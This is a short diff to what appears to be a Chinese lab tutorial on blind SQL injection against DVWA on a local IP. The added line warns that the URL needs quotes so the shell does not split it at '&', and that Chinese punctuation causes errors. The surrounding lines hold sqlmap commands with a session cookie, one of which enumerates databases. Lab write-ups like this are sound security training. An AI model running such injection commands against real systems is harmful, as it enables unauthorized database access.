@@ -114,6 +114,8 @@ cover: https://img-blog.csdnimg.cn/6a525f6f18c64ca788535b07bd3b86ec.png#pic_cent
 
 ## 过程中的命令
 
+输入命令的时候容易出错的地方主要是：引号必须加，否则命令会被识别为系统&命令，还有英文字符，写成中文字符会报错
+
 - python sqlmap.py -u "http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id = 1&Submit = Submit#" --cookie = "security = low; PHPSESSID = 59mb9spqvkd9cuk543thagtsd5" --batch
 
 - python sqlmap.py -u "http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id = 1&Submit = Submit#" --cookie = "security = low; PHPSESSID = 59mb9spqvkd9cuk543thagtsd5" --batch --dbs
